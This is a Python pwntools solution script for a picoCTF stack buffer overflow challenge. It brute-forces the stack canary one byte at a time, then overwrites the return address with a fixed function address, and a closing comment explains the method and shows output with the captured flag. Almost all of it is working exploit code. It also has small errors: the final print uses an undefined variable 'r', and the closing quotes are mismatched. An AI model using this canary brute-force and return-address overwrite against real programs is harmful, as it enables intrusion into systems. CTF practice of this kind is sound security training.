from pwn import *
import string
import struct

def pack(x):
    return struct.pack("I", x)

payload = "A"*32
charset = string.printable
for x in range(4):
    for char in range(256):
        candidate = payload + chr(char)
        p = process("./vuln")
        p.sendline(str(len(candidate)))
        p.sendline(candidate)
        response = p.recv()
        if "Stack Smashing" not in response:
            payload += chr(char)
            break
        p.close()

print("Found canary")
print(payload)
print(len(payload))
payload += "A"*12
payload += "B"*4
payload += pack(0x80486eb)
p = process("./vuln")
p.sendline(str(len(payload)))
p.sendline(payload)
print(r.recv())

"""
Even though there's a canary that is checked before the function returns, we can brute
force its value by overwriting one byte of the canary then checking if the value of that byte
is correct or not. After we find the canary, we can continue our payload like the other
overflow challenges.

$ python solution.py
...
Found canary
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAARgcd
How Many Bytes will You Write Into the Buffer?
> Input> Ok... Now Where's the Flag?
picoCTF{eT_tU_bRuT3_F0Rc3_6b01eec0}
""
